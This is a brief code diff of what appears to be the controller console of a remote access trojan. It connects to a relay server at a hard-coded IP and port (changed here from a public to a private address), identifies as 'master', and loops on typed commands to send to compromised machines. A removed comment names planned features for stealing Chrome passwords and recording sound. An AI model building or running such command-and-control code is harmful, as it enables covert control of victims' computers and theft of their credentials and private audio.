@@ -6,7 +6,7 @@ import soundfile as sf
 
 
 bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-bridge.connect(("45.80.148.246", 9999))
+bridge.connect(("192.168.1.36", 9999))
 
 bridge.send(b"master")
 
@@ -35,8 +35,6 @@ def send(data, cli):
     size = len(data)
     cli.sendall(struct.pack(">L", size) + data)
 
-
-# TODO:chrome password and sound recorder!
 
 while True:
     command = input("cmd>")
